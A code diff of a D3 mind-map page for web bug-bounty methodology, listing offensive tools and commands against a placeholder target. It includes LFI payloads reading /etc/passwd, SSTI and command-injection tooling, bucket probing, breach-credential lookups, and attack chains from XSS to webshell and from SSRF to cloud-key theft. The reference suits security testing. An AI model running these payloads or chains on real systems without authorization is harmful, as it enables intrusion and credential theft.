-          { name: "tplmap", _color:"#f85149", cmd: "python3 tplmap.py -u 'https://target.com/page?name=test'", url: "https://github.com/epinna/tplmap", desc: "Auto SSTI: Jinja2, Twig, Freemarker, Velocity, Thymeleaf, ERB..." },
-          { name: "qsreplace SSTI", _color:"#f85149", cmd: "cat urls.txt | qsreplace '{{7*7}}' | httpx -ms '49'", url: "https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection", desc: "Mass SSTI spray — if 49 appears in response, template engine confirmed" },
+        { name: "LFI / Path Traversal", icon: "📁", _color: "#f05151", children: [
+          { name: "Liffy", _color:"#f05151", cmd: "python3 liffy.py -u 'https://target.com/page?file=FUZZ'\n# Also:\ncat lfi_targets.txt | qsreplace '../../../../etc/passwd' | httpx -ms 'root:x:'", url: "https://github.com/mzfr/liffy", desc: "From image: Liffy is a LFI exploitation tool with filter bypass support. PHP wrappers, log poisoning, RCE chains." },
+          { name: "PHP wrapper LFI", _color:"#f05151", cmd: "cat lfi_targets.txt | qsreplace 'php://filter/convert.base64-encode/resource=index.php'", url: "https://www.php.net/manual/en/wrappers.php", desc: "PHP filter wrapper reads source code as base64 — bypasses execution" },
         ]},
-        { name: "CRLF / Smuggling", icon: "🔀", _color: "#f85149", children: [
-          { name: "crlfuzz", _color:"#f85149", cmd: "crlfuzz -l live_urls.txt -o crlf_results.txt", url: "https://github.com/dwisiswant0/crlfuzz", desc: "Fast CRLF injection scanner across all URLs" },
-          { name: "smuggler", _color:"#f85149", cmd: "python3 smuggler.py -u https://target.com", url: "https://github.com/defparam/smuggler", desc: "HTTP request smuggling: CL.TE, TE.CL, TE.TE desync detection" },
-          { name: "h2csmuggler", _color:"#f85149", cmd: "python3 h2csmuggler.py -x https://target.com", url: "https://github.com/BishopFox/h2cSmuggler", desc: "HTTP/2 cleartext smuggling — bypass reverse proxy restrictions" },
+        { name: "SSTI", icon: "📝", _color: "#f05151", children: [
+          { name: "SSTIMap", _color:"#f05151", cmd: "python3 sstimap.py -u 'https://target.com/page?name=test'\npython3 sstimap.py -i urls.txt", url: "https://github.com/vladko312/SSTImap", desc: "From image: SSTIMap is the updated tplmap alternative. Auto-detect and exploit SSTI: Jinja2, Twig, Freemarker, Velocity, ERB..." },
+          { name: "qsreplace SSTI spray", _color:"#f05151", cmd: "cat urls.txt | qsreplace '{{7*7}}' | httpx -ms '49'", url: "https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection", desc: "Mass SSTI spray — if 49 in response = template engine confirmed" },
+        ]},
+        { name: "Command Injection", icon: "💻", _color: "#f05151", children: [
+          { name: "Commix", _color:"#f05151", cmd: "commix --url='https://target.com/page?cmd=test' --batch\n# Or from file:\ncommix --url-file=cmd_targets.txt --batch", url: "https://github.com/commixproject/commix", desc: "From image: Commix is an automated command injection and exploitation tool. Supports all major injection contexts and OS." },
+        ]},
+        { name: "CORS", icon: "🔗", _color: "#f05151", children: [
+          { name: "Corsy", _color:"#f05151", cmd: "python3 corsy.py -i live_urls.txt -t 20", url: "https://github.com/s0md3v/Corsy", desc: "From image: Corsy advanced CORS misconfiguration scanner. Tests origin reflection, null origin, subdomain bypass + credentials." },
+          { name: "CORScanner", _color:"#f05151", cmd: "python3 cors_scan.py -i live_urls.txt -o cors.json", url: "https://github.com/chenjj/CORScanner", desc: "Test: origin reflection, null origin, subdomain bypass + credentials" },
+        ]},
+        { name: "CRLF / Smuggling", icon: "🔀", _color: "#f05151", children: [
+          { name: "crlfuzz", _color:"#f05151", cmd: "crlfuzz -l live_urls.txt -o crlf_results.txt", url: "https://github.com/dwisiswant0/crlfuzz", desc: "From image: CRLFuzz — fast CRLF injection scanner across all URLs" },
+          { name: "smuggler", _color:"#f05151", cmd: "python3 smuggler.py -u https://target.com", url: "https://github.com/defparam/smuggler", desc: "HTTP request smuggling: CL.TE, TE.CL, TE.TE desync detection" },
+          { name: "h2csmuggler", _color:"#f05151", cmd: "python3 h2csmuggler.py -x https://target.com", url: "https://github.com/BishopFox/h2cSmuggler", desc: "HTTP/2 cleartext smuggling — bypass reverse proxy restrictions" },
         ]},
       ]
     },
     {
-      name: "10 · Subdomain Takeover",
-      icon: "🏴", _color: "#58a6ff",
+      name: "10 · API & GraphQL", icon: "🔌", _color: "#4d9de0",
       children: [
-        { name: "Takeover Detection", icon: "⚠️", _color: "#f85149", children: [
-          { name: "nuclei takeover", _color:"#f85149", cmd: "nuclei -l alive.txt -tags takeover -o takeovers.txt", url: "https://github.com/projectdiscovery/nuclei-templates", desc: "30+ takeover fingerprints: GitHub, Heroku, S3, Azure, Shopify..." },
-          { name: "subjack", _color:"#f85149", cmd: "subjack -w alive.txt -t 100 -o subjack.txt -a", url: "https://github.com/haccer/subjack", desc: "Check CNAME records for dangling references to claimable services" },
-          { name: "can-i-take-over", _color:"#3fb950", cmd: "# Reference: github.com/EdOverflow/can-i-take-over-xyz\n# Check each service's specific takeover fingerprint", url: "https://github.com/EdOverflow/can-i-take-over-xyz", desc: "Definitive list of which services are vulnerable to takeover" },
+        { name: "GraphQL", icon: "◉", _color: "#a78bfa", children: [
+          { name: "GraphQL Map", _color:"#f05151", cmd: "python3 graphqlmap.py -u https://target.com/graphql --headers '{\"Authorization\":\"Bearer TOKEN\"}'\n# Also try introspection:\ncurl -X POST https://target.com/graphql -d '{\"query\":\"{__schema{types{name}}}\"}'", url: "https://github.com/swisskyrepo/GraphQLmap", desc: "From image API → GraphQL Map node: automated GraphQL security testing, introspection, query fuzzing, injection." },
+          { name: "InQL (Burp extension)", _color:"#39d353", cmd: "# Install InQL in Burp Suite\n# Point to: https://target.com/graphql\n# Auto-generates all queries from schema\n# Scan each query for injection", url: "https://github.com/doyensec/inql", desc: "Burp extension for GraphQL — generates all queries from introspection, security scanner built in" },
+          { name: "Clairvoyance", _color:"#f05151", cmd: "python3 -m clairvoyance https://target.com/graphql -o schema.json", url: "https://github.com/nikitastupin/clairvoyance", desc: "Recover GraphQL schema even when introspection is disabled via wordlist attack" },
         ]},
-        { name: "DNS Misconfiguration", icon: "📧", _color: "#bc8cff", children: [
-          { name: "Zone Transfer", _color:"#f85149", cmd: "dig axfr @ns1.target.com target.com", url: "https://digi.ninja/projects/zonetransferme.php", desc: "If allowed — dumps entire DNS zone including internal hosts" },
-          { name: "SPF/DMARC check", _color:"#3fb950", cmd: "dig txt target.com | grep spf\ndig txt _dmarc.target.com", url: "https://mxtoolbox.com", desc: "Missing SPF/DMARC = email spoofing from @target.com. Valid finding." },
+        { name: "API Fuzzing", icon: "⚡", _color: "#a78bfa", children: [
+          { name: "kiterunner (API routes)", _color:"#39d353", cmd: "kr scan live_urls.txt -w routes-large.kite -x 20\nkr brute https://target.com/api -w routes-large.kite", url: "https://github.com/assetnote/kiterunner", desc: "API route discovery with real-world API patterns — finds endpoints ffuf misses" },
+          { name: "ffuf API fuzzing", _color:"#39d353", cmd: "ffuf -u https://target.com/api/v1/FUZZ -w api_wordlist.txt -mc 200,201,401,403 -ac", url: "https://github.com/ffuf/ffuf", desc: "Fuzz API versions (v1, v2), methods, and endpoints" },
+          { name: "API versioning test", _color:"#f05151", cmd: "# Test deprecated versions:\nffuf -u https://target.com/FUZZ/users -w versions.txt -mc 200\n# Wordlist: api, api/v1, api/v2, api/v3, v1, v2, rest, graphql", url: "https://owasp.org/API-Security/", desc: "Old API versions often lack auth checks — v1 vs v2 auth bypass is common critical finding" },
         ]},
       ]
     },
     {
-      name: "11 · Cloud Attacks",
-      icon: "☁️", _color: "#58a6ff",
+      name: "11 · Cloud Attacks", icon: "☁️", _color: "#4d9de0",
       children: [
-        { name: "Storage Buckets", icon: "🪣", _color: "#f85149", children: [
-          { name: "S3 Scanner", _color:"#f85149", cmd: "python3 s3scanner.py --bucket-name target-com-backups,target-uploads,target-dev", url: "https://github.com/sa7mon/S3Scanner", desc: "Find open S3 buckets: public read, write, or list permissions" },
-          { name: "cloud_enum", _color:"#3fb950", cmd: "python3 cloud_enum.py -k target.com -k target", url: "https://github.com/initstring/cloud_enum", desc: "Brute force AWS, Azure, GCP storage using company keywords" },
-          { name: "Firebase check", _color:"#f85149", cmd: "curl -s https://target.firebaseio.com/.json", url: "https://firebase.google.com", desc: "Unauthenticated Firebase = read/write entire database. Instant critical." },
+        { name: "Storage Buckets", icon: "🪣", _color: "#f05151", children: [
+          { name: "S3 Scanner", _color:"#f05151", cmd: "python3 s3scanner.py --bucket-name target-com-backups,target-uploads,target-dev", url: "https://github.com/sa7mon/S3Scanner", desc: "Find open S3 buckets: public read, write, or list permissions" },
+          { name: "cloud_enum", _color:"#39d353", cmd: "python3 cloud_enum.py -k target.com -k target", url: "https://github.com/initstring/cloud_enum", desc: "Brute force AWS, Azure, GCP storage using company keywords" },
+          { name: "Firebase check", _color:"#f05151", cmd: "curl -s https://target.firebaseio.com/.json", url: "https://firebase.google.com", desc: "Unauthenticated Firebase = read/write entire database. Instant critical." },
         ]},
-        { name: "CORS Scanning", icon: "🔗", _color: "#f85149", children: [
-          { name: "CORScanner", _color:"#f85149", cmd: "python3 cors_scan.py -i live_urls.txt -o cors.json", url: "https://github.com/chenjj/CORScanner", desc: "Test: origin reflection, null origin, subdomain bypass + credentials" },
-          { name: "Corsy", _color:"#f85149", cmd: "python3 corsy.py -i live_urls.txt -t 20", url: "https://github.com/s0md3v/Corsy", desc: "Advanced CORS misconfiguration scanner with regex bypass checks" },
+        { name: "CORS Scanning", icon: "🔗", _color: "#f05151", children: [
+          { name: "CORScanner", _color:"#f05151", cmd: "python3 cors_scan.py -i live_urls.txt -o cors.json", url: "https://github.com/chenjj/CORScanner", desc: "Test: origin reflection, null origin, subdomain bypass + credentials" },
+          { name: "Corsy", _color:"#f05151", cmd: "python3 corsy.py -i live_urls.txt -t 20", url: "https://github.com/s0md3v/Corsy", desc: "Advanced CORS misconfiguration scanner with regex bypass checks" },
         ]},
       ]
     },
     {
-      name: "12 · OSINT",
-      icon: "👤", _color: "#58a6ff",
+      name: "12 · OSINT", icon: "👤", _color: "#4d9de0",
       children: [
-        { name: "Email & Employee", icon: "📧", _color: "#bc8cff", children: [
-          { name: "hunter.io", _color:"#3fb950", cmd: "# Search: hunter.io/domain-search?domain=target.com\n# Reveals email pattern + employee names", url: "https://hunter.io", desc: "Email pattern (first.last@) + employee names → for password spray" },
-          { name: "dehashed", _color:"#f85149", cmd: "# Search: dehashed.com — email:@target.com\n# Returns breach data: passwords, hashes", url: "https://dehashed.com", desc: "Breach database — check if employee emails have leaked passwords" },
-          { name: "h8mail", _color:"#f85149", cmd: "h8mail -t user@target.com -bc breach_compilation/", url: "https://github.com/khast3x/h8mail", desc: "Automated breach credential lookup across multiple sources" },
+        { name: "Email & Employee", icon: "📧", _color: "#a78bfa", children: [
+          { name: "hunter.io", _color:"#39d353", cmd: "# Search: hunter.io/domain-search?domain=target.com\n# Reveals email pattern + employee names", url: "https://hunter.io", desc: "Email pattern (first.last@) + employee names → for password spray" },
+          { name: "dehashed", _color:"#f05151", cmd: "# Search: dehashed.com — email:@target.com\n# Returns breach data: passwords, hashes", url: "https://dehashed.com", desc: "Breach database — check if employee emails have leaked passwords" },
+          { name: "h8mail", _color:"#f05151", cmd: "h8mail -t user@target.com -bc breach_compilation/", url: "https://github.com/khast3x/h8mail", desc: "Automated breach credential lookup across multiple sources" },
         ]},
-        { name: "GitHub Dorking", icon: "🐙", _color: "#f85149", children: [
-          { name: "GitHub search", _color:"#f85149", cmd: "# GitHub.com search:\n# \"target.com\" password\n# \"target.com\" api_key  \n# \"target.com\" secret_key\n# org:targetorg filename:.env", url: "https://github.com/search", desc: "Search code for leaked creds, .env files, config files, API keys" },
-          { name: "gitleaks org", _color:"#f85149", cmd: "gitleaks detect --source=https://github.com/targetorg -v", url: "https://github.com/gitleaks/gitleaks", desc: "Scan all org repos for committed secrets in entire git history" },
-          { name: "Postman search", _color:"#f85149", cmd: "# Google: site:postman.com target.com\n# Or: postman.com/search?q=target.com", url: "https://postman.com", desc: "Leaked Postman collections with auth tokens and API requests" },
+        { name: "GitHub Dorking", icon: "🐙", _color: "#f05151", children: [
+          { name: "GitHub search dorks", _color:"#f05151", cmd: "# GitHub.com search:\n\"target.com\" password\n\"target.com\" api_key\n\"target.com\" secret_key\norg:targetorg filename:.env", url: "https://github.com/search", desc: "Search code for leaked creds, .env files, config files, API keys" },
+          { name: "gitleaks org scan", _color:"#f05151", cmd: "gitleaks detect --source=https://github.com/targetorg -v", url: "https://github.com/gitleaks/gitleaks", desc: "Scan all org repos for committed secrets in entire git history" },
+          { name: "Postman search", _color:"#f05151", cmd: "# Google: site:postman.com target.com\n# Or: postman.com/search?q=target.com", url: "https://postman.com", desc: "Leaked Postman collections with auth tokens and API requests" },
         ]},
       ]
     },
     {
-      name: "13 · Chain & Escalate",
-      icon: "⛓️", _color: "#58a6ff",
+      name: "13 · Chain & Escalate", icon: "⛓️", _color: "#4d9de0",
       children: [
-        { name: "Critical Chains", icon: "💀", _color: "#f85149", children: [
-          { name: "Open Redirect → OAuth token theft", _color:"#f85149", cmd: "# 1. Find open redirect on target\n# 2. Set as redirect_uri in OAuth flow\n# 3. Victim clicks → auth code sent to attacker URL\n# 4. Exchange code for access token → account takeover", desc: "Low redirect + OAuth = Critical account takeover" },
-          { name: "XSS → Admin ATO → RCE", _color:"#f85149", cmd: "# 1. Find stored XSS (even self-XSS + CSRF works)\n# 2. Steal admin session cookie\n# 3. Access admin panel → find file upload/code exec\n# 4. Upload webshell → RCE", desc: "XSS chain: session theft → admin access → code execution" },
-          { name: "SSRF → Cloud metadata → Full compromise", _color:"#f85149", cmd: "# 1. Find SSRF (even partial/blind)\n# 2. Hit http://169.254.169.254/latest/meta-data/iam/\n# 3. Extract AWS AccessKeyId + SecretAccessKey\n# 4. aws configure → full cloud access", desc: "SSRF to cloud credentials = keys to the entire kingdom" },
-          { name: "Info leak → Source code → 0-day", _color:"#f85149", cmd: "# 1. Find .git exposure or path traversal\n# 2. Download source code (git-dumper)\n# 3. Code review: find SQLi, RCE, auth bypass\n# 4. Exploit undiscovered vulnerability = 0-day", desc: "Source code access turns every code bug into a live exploit" },
-          { name: "Subdomain takeover → Cookie theft", _color:"#f85149", cmd: "# 1. Take over sub.target.com\n# 2. If cookies scoped to .target.com → steal sessions\n# 3. Or: host phishing page on trusted domain\n# 4. Serve malicious content from target's domain", desc: "Takeover + broad cookie scope = steal sessions on main domain" },
-          { name: "Race condition → Infinite money", _color:"#f85149", cmd: "# 1. Find payment/transfer/coupon endpoint\n# 2. Send 50+ parallel requests (Turbo Intruder)\n# 3. Single-packet attack for precise timing\n# 4. Exceed balance, reuse coupons, duplicate transactions", desc: "TOCTOU race on financial operations = unlimited exploitation" },
+        { name: "Critical Chains", icon: "💀", _color: "#f05151", children: [
+          { name: "Open Redirect → OAuth ATO", _color:"#f05151", cmd: "# 1. Find open redirect on target\n# 2. Set as redirect_uri in OAuth flow\n# 3. Victim clicks → auth code sent to attacker URL\n# 4. Exchange code for access token → ATO", desc: "Low redirect + OAuth = Critical account takeover chain" },
+          { name: "XSS → Admin ATO → RCE", _color:"#f05151", cmd: "# 1. Stored XSS (even self-XSS + CSRF)\n# 2. Steal admin session cookie\n# 3. Access admin panel → file upload\n# 4. Upload webshell → RCE", desc: "XSS chain: session theft → admin access → code execution" },
+          { name: "SSRF → Cloud metadata → PWN", _color:"#f05151", cmd: "# 1. Find SSRF (even blind)\n# 2. http://169.254.169.254/latest/meta-data/iam/\n# 3. Extract AWS AccessKeyId + SecretAccessKey\n# 4. aws configure → full cloud access", desc: "SSRF to cloud credentials = keys to the entire kingdom" },
+          { name: "Info leak → Source → 0-day", _color:"#f05151", cmd: "# 1. .git exposure or path traversal\n# 2. git-dumper target.com .git_dump\n# 3. Code review: SQLi, RCE, auth bypass\n# 4. Exploit undiscovered vuln = 0-day", desc: "Source code access turns every code bug into a live exploit" },
+          { name: "Subdomain TO → Cookie theft", _color:"#f05151", cmd: "# 1. Take over sub.target.com\n# 2. Cookies scoped to .target.com → steal sessions\n# 3. Or: host phishing on trusted domain", desc: "Takeover + broad cookie scope = steal sessions on main domain" },
+          { name: "Race condition → ∞ money", _color:"#f05151", cmd: "# 1. Find payment/coupon endpoint\n# 2. Send 50+ parallel requests (Turbo Intruder)\n# 3. Single-packet attack for precision\n# 4. Exceed balance, reuse coupons", desc: "TOCTOU race on financial operations = unlimited exploitation" },
         ]},
       ]
     },
     {
-      name: "14 · Monitor & Report",
-      icon: "🔔", _color: "#58a6ff",
+      name: "14 · Monitor & Report", icon: "🔔", _color: "#4d9de0",
       children: [
-        { name: "Continuous Monitoring", icon: "👁️", _color: "#bc8cff", children: [
-          { name: "Subdomain monitor", _color:"#3fb950", cmd: "# Cron job (daily):\nsubfinder -d target.com -silent | anew known_subs.txt | notify -silent", url: "https://github.com/projectdiscovery/notify", desc: "Daily subdomain check → alert on NEW subdomains → scan immediately" },
-          { name: "crt.sh monitor", _color:"#3fb950", cmd: "# Monitor new certs:\ncurl -s 'https://crt.sh/?q=%.target.com&output=json' | jq -r '.[].name_value' | anew known_certs.txt | notify", url: "https://crt.sh", desc: "New SSL certs = new subdomains being deployed. Be first to test." },
-          { name: "GitHub monitor", _color:"#3fb950", cmd: "# Watch: github.com/targetorg for new repos\n# Use: github-subdomains -d target.com -t TOKEN | anew | notify", url: "https://github.com", desc: "New repos may contain secrets. Auto-scan on push." },
-          { name: "nuclei on new assets", _color:"#f85149", cmd: "# Pipeline: new_subdomain → httpx → nuclei -severity critical,high → notify", url: "https://github.com/projectdiscovery/nuclei", desc: "Auto-scan every new asset within minutes of deployment" },
+        { name: "Continuous Monitoring", icon: "👁️", _color: "#a78bfa", children: [
+          { name: "Subdomain monitor", _color:"#39d353", cmd: "# Cron job (daily):\nsubfinder -d target.com -silent | anew known_subs.txt | notify -silent", url: "https://github.com/projectdiscovery/notify", desc: "Daily subdomain check → alert on NEW subdomains → scan immediately" },
+          { name: "crt.sh monitor", _color:"#39d353", cmd: "curl -s 'https://crt.sh/?q=%.target.com&output=json' | jq -r '.[].name_value' | anew known_certs.txt | notify", url: "https://crt.sh", desc: "New SSL certs = new subdomains being deployed. Be first to test." },
+          { name: "GitHub monitor", _color:"#39d353", cmd: "github-subdomains -d target.com -t TOKEN | anew | notify", url: "https://github.com", desc: "New repos may contain secrets. Auto-scan on push." },
+          { name: "Auto-scan new assets", _color:"#f05151", cmd: "# Pipeline:\nnew_subdomain | httpx | nuclei -severity critical,high | notify", url: "https://github.com/projectdiscovery/nuclei", desc: "Auto-scan every new asset within minutes of deployment" },
         ]},
-        { name: "Reporting", icon: "📝", _color: "#bc8cff", children: [
-          { name: "Report template", _color:"#3fb950", cmd: "# Structure:\n# Title: [Severity] Vuln Type on endpoint\n# CVSS: X.X (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)\n# Description: What + where + why it matters\n# Steps to Reproduce: numbered, exact HTTP requests\n# Impact: quantified (N users affected, data exposed)\n# Remediation: specific fix recommendation\n# Evidence: screenshots, HTTP req/res, video PoC", desc: "Good report = fast triage + higher severity rating + bigger payout" },
+        { name: "Reporting", icon: "📝", _color: "#a78bfa", children: [
+          { name: "Report template", _color:"#39d353", cmd: "# Title: [Severity] VulnType on endpoint\n# CVSS: X.X (AV:N/AC:L/PR:N/UI:N)\n# Description: what + where + why\n# Steps: numbered HTTP requests\n# Impact: quantified (N users, data)\n# Remediation: specific fix\n# Evidence: screenshots, video PoC", desc: "Good report = fast triage + higher severity + bigger payout" },
         ]},
       ]
     },
   ]
 };
 
-// ════════════════════════════════════════════════════════
-// D3 COLLAPSIBLE TREE
-// ════════════════════════════════════════════════════════
-
+// ═══════════════════════════════════════════════════════
+// D3 TREE SETUP
+// ═══════════════════════════════════════════════════════
 const svg = d3.select("#treeSvg");
 const container = svg.append("g").attr("id","treeGroup");
+const W = window.innerWidth;
+const H = window.innerHeight - 52;
 
-const width = window.innerWidth;
-const height = window.innerHeight - 48;
-
-// Zoom
+// Zoom with touch support
 const zoom = d3.zoom()
-  .scaleExtent([0.1, 3])
+  .scaleExtent([0.08, 3])
   .on("zoom", e => container.attr("transform", e.transform));
 
 svg.call(zoom);
 
-// Initial transform
-svg.call(zoom.transform, d3.zoomIdentity.translate(140, height / 2).scale(0.85));
+const initScale = isMobile ? 0.45 : 0.8;
+const initX = isMobile ? 100 : 160;
+svg.call(zoom.transform, d3.zoomIdentity.translate(initX, H / 2).scale(initScale));
 
-const treemap = d3.tree().nodeSize([22, 280]);
+const treemap = d3.tree().nodeSize([isMobile ? 18 : 22, isMobile ? 220 : 270]);
 
 let root = d3.hierarchy(DATA);
-root.x0 = height / 2;
+root.x0 = H / 2;
 root.y0 = 0;
 
-// Collapse all except first 2 levels
-function collapseAfterDepth(d, depth) {
-  if (d.children && d.depth >= depth) {
-    d._children = d.children;
-    d._children.forEach(c => collapseAfterDepth(c, depth));
-    d.children = null;
-  } else if (d.children) {
-    d.children.forEach(c => collapseAfterDepth(c, depth));
-  }
-}
-
+// Collapse to depth 0 initially
 root.descendants().forEach(d => {
   if (d.children && d.depth >= 1) {
     d._children = d.children;
@@ -562,263 +667,272 @@ root.descendants().forEach(d => {
   }
 });
 
-let i = 0;
-const duration = 400;
+let nodeId = 0;
+const duration = isMobile ? 250 : 380;
 
+// ═══════════════════════════════════════════════════════
+// UPDATE FUNCTION
+// ═══════════════════════════════════════════════════════
 function update(source) {
   const treeData = treemap(root);
   const nodes = treeData.descendants();
   const links = treeData.links();
 
-  nodes.forEach(d => { d.y = d.depth * 260; });
+  nodes.forEach(d => { d.y = d.depth * (isMobile ? 200 : 255); });
 
-  // NODES
-  const node = container.selectAll("g.node")
-    .data(nodes, d => d.id || (d.id = ++i));
-
-  const nodeEnter = node.enter().append("g")
-    .attr("class", "node")
-    .attr("transform", d => `translate(${source.y0},${source.x0})`)
-    .on("click", (event, d) => { toggle(d); update(d); })
-    .on("contextmenu", (event, d) => { event.preventDefault(); showTooltip(event, d); });
-
-  nodeEnter.append("circle")
-    .attr("r", 0)
-    .style("fill", d => d._children ? (d.data._color || "#58a6ff") : (d.data._color ? d.data._color + "40" : "#21262d"))
-    .style("stroke", d => d.data._color || "#58a6ff");
-
-  nodeEnter.append("text")
-    .attr("dy", ".35em")
-    .attr("x", d => d.children || d._children ? -14 : 14)
-    .attr("text-anchor", d => d.children || d._children ? "end" : "start")
-    .text(d => {
-      let t = d.data.icon ? d.data.icon + " " + d.data.name : d.data.name;
-      return t.length > 38 ? t.substring(0,36) + "…" : t;
-    })
-    .style("fill", d => d.data._color === "#f85149" ? "#f85149" : "#c9d1d9")
-    .style("font-size", d => d.depth === 0 ? "15px" : d.depth === 1 ? "13px" : "12px")
-    .style("font-weight", d => d.depth <= 1 ? "600" : "400");
-
-  // Command hint text
-  nodeEnter.filter(d => d.data.cmd && !d.children && !d._children)
-    .append("text")
-    .attr("class", "cmd-text")
-    .attr("dy", "1.6em")
-    .attr("x", 14)
-    .text(d => {
-      const c = d.data.cmd.split("\n")[0];
-      return c.length > 50 ? c.substring(0, 48) + "…" : c;
-    });
-
-  // UPDATE
-  const nodeUpdate = nodeEnter.merge(node);
-
-  nodeUpdate.transition().duration(duration)
-    .attr("transform", d => `translate(${d.y},${d.x})`);
-
-  nodeUpdate.select("circle")
-    .attr("r", d => d.depth === 0 ? 10 : d._children ? 7 : 5)
-    .style("fill", d => d._children ? (d.data._color || "#58a6ff") : (d.data._color ? d.data._color + "30" : "#21262d"))
-    .style("stroke", d => d.data._color || "#30363d");
-
-  // EXIT
-  const nodeExit = node.exit().transition().duration(duration)
-    .attr("transform", d => `translate(${source.y},${source.x})`)
-    .remove();
-
-  nodeExit.select("circle").attr("r", 0);
-  nodeExit.select("text").style("fill-opacity", 0);
+  // Link class
+  function linkClass(d) {
+    const c = d.target.data._color;
+    if (c === "#f05151") return "link exploit";
+    if (c === "#39d353") return "link tool";
+    if (c === "#4d9de0") return "link phase";
+    return "link";
+  }
 
   // LINKS
   const link = container.selectAll("path.link")
     .data(links, d => d.target.id);
 
   const linkEnter = link.enter().insert("path", "g")
-    .attr("class", "link")
-    .attr("d", d => {
+    .attr("class", linkClass)
+    .attr("d", () => {
       const o = {x: source.x0, y: source.y0};
       return diagonal(o, o);
     });
 
-  const linkUpdate = linkEnter.merge(link);
-  linkUpdate.transition().duration(duration)
+  linkEnter.merge(link).transition().duration(duration)
+    .attr("class", linkClass)
     .attr("d", d => diagonal(d.source, d.target));
 
   link.exit().transition().duration(duration)
-    .attr("d", d => {
+    .attr("d", () => {
       const o = {x: source.x, y: source.y};
       return diagonal(o, o);
     }).remove();
 
-  // Store old positions
-  nodes.forEach(d => { d.x0 = d.x; d.y0 = d.y; });
+  // NODES
+  const node = container.selectAll("g.node")
+    .data(nodes, d => d.id || (d.id = ++nodeId));
 
+  const nodeEnter = node.enter().append("g")
+    .attr("class", "node")
+    .attr("transform", () => `translate(${source.y0},${source.x0})`);
+
+  // Desktop: click to expand, right-click for details
+  // Mobile: tap to expand, long-press for details
+  let pressTimer = null;
+
+  nodeEnter
+    .on("click", function(event, d) {
+      event.stopPropagation();
+      if (pressTimer) { clearTimeout(pressTimer); pressTimer = null; }
+      toggle(d);
+      update(d);
+    })
+    .on("contextmenu", function(event, d) {
+      event.preventDefault();
+      showDetail(event, d);
+    })
+    .on("touchstart", function(event, d) {
+      pressTimer = setTimeout(() => {
+        pressTimer = null;
+        showDetail(event, d, true);
+      }, 500);
+    })
+    .on("touchend", function() {
+      if (pressTimer) { clearTimeout(pressTimer); pressTimer = null; }
+    })
+    .on("touchmove", function() {
+      if (pressTimer) { clearTimeout(pressTimer); pressTimer = null; }
+    });
+
+  nodeEnter.append("circle")
+    .attr("r", 0)
+    .style("fill", d => d._children ? (d.data._color || "#4d9de0") : (d.data._color ? d.data._color + "28" : "#1e2a35"))
+    .style("stroke", d => d.data._color || "#4d9de0")
+    .style("color", d => d.data._color || "#4d9de0");
+
+  nodeEnter.append("text")
+    .attr("dy", ".35em")
+    .attr("x", d => (d.children || d._children) ? -13 : 13)
+    .attr("text-anchor", d => (d.children || d._children) ? "end" : "start")
+    .text(d => {
+      const t = d.data.icon ? d.data.icon + " " + d.data.name : d.data.name;
+      const maxLen = isMobile ? 30 : 40;
+      return t.length > maxLen ? t.substring(0, maxLen - 1) + "…" : t;
+    })
+    .style("fill", d => d.data._color === "#f05151" ? "#f05151" : d.data._color === "#39d353" ? "#cdd9e5" : "#cdd9e5")
+    .style("font-size", d => d.depth === 0 ? (isMobile ? "13px" : "15px") : d.depth === 1 ? (isMobile ? "11px" : "13px") : (isMobile ? "10px" : "12px"))
+    .style("font-weight", d => d.depth <= 1 ? "700" : "400");
+
+  // CMD hint (desktop only)
+  if (!isMobile) {
+    nodeEnter.filter(d => d.data.cmd && !d.children && !d._children)
+      .append("text")
+      .attr("class", "cmd-hint")
+      .attr("dy", "1.6em").attr("x", 13)
+      .text(d => {
+        const c = d.data.cmd.split("\n")[0];
+        return c.length > 52 ? c.substring(0, 50) + "…" : c;
+      });
+  }
+
+  const nodeUpdate = nodeEnter.merge(node);
+
+  nodeUpdate.transition().duration(duration)
+    .attr("transform", d => `translate(${d.y},${d.x})`);
+
+  nodeUpdate.select("circle")
+    .attr("r", d => d.depth === 0 ? (isMobile ? 8 : 10) : d._children ? (isMobile ? 5 : 7) : (isMobile ? 4 : 5))
+    .style("fill", d => d._children ? (d.data._color || "#4d9de0") + "cc" : (d.data._color ? d.data._color + "20" : "#1e2a35"))
+    .style("stroke", d => d.data._color || "#243040");
+
+  node.exit().transition().duration(duration)
+    .attr("transform", () => `translate(${source.y},${source.x})`)
+    .remove();
+
+  nodes.forEach(d => { d.x0 = d.x; d.y0 = d.y; });
   updateCount();
 }
 
 function diagonal(s, d) {
-  return `M ${s.y} ${s.x} C ${(s.y + d.y) / 2} ${s.x}, ${(s.y + d.y) / 2} ${d.x}, ${d.y} ${d.x}`;
+  return `M${s.y} ${s.x}C${(s.y+d.y)/2} ${s.x},${(s.y+d.y)/2} ${d.x},${d.y} ${d.x}`;
 }
 
 function toggle(d) {
-  if (d.children) {
-    d._children = d.children;
-    d.children = null;
-  } else {
-    d.children = d._children;
-    d._children = null;
-  }
+  if (d.children) { d._children = d.children; d.children = null; }
+  else { d.children = d._children; d._children = null; }
 }
 
-// ════════════════════════════════════════════════════════
-// TOOLTIP
-// ════════════════════════════════════════════════════════
-
-function showTooltip(event, d) {
+// ═══════════════════════════════════════════════════════
+// DETAIL PANEL
+// ═══════════════════════════════════════════════════════
+function showDetail(event, d, fromTouch = false) {
   const data = d.data;
   if (!data.cmd && !data.desc) return;
 
-  const tt = document.getElementById("tooltip");
-  const color = data._color || "#58a6ff";
-  const iconBg = color + "20";
+  const panel = document.getElementById("detailPanel");
+  const color = data._color || "#4d9de0";
+  const isExploit = data._color === "#f05151";
+  const iconBg = color + "18";
 
-  let cmdBlock = "";
+  let cmdHtml = "";
   if (data.cmd) {
-    cmdBlock = `<div class="tt-cmd-block"><button class="copy-btn" onclick="navigator.clipboard.writeText(this.parentElement.innerText.replace('COPY','').trim())">COPY</button>${escHtml(data.cmd)}</div>`;
+    cmdHtml = `<div class="dp-cmd"><button class="copy-btn" onclick="copyCmd(this)">COPY</button>${escHtml(data.cmd)}</div>`;
   }
 
-  let linksBlock = "";
+  let linkHtml = "";
   if (data.url) {
-    linksBlock = `<div class="tt-links"><a class="tt-link" href="${data.url}" target="_blank" rel="noopener">🔗 Tool / Reference ↗</a></div>`;
+    linkHtml = `<div style="margin-top:8px"><a class="dp-link" href="${data.url}" target="_blank" rel="noopener">🔗 Tool / Reference ↗</a></div>`;
   }
 
-  const isExploit = data._color === "#f85149";
-
-  tt.innerHTML = `
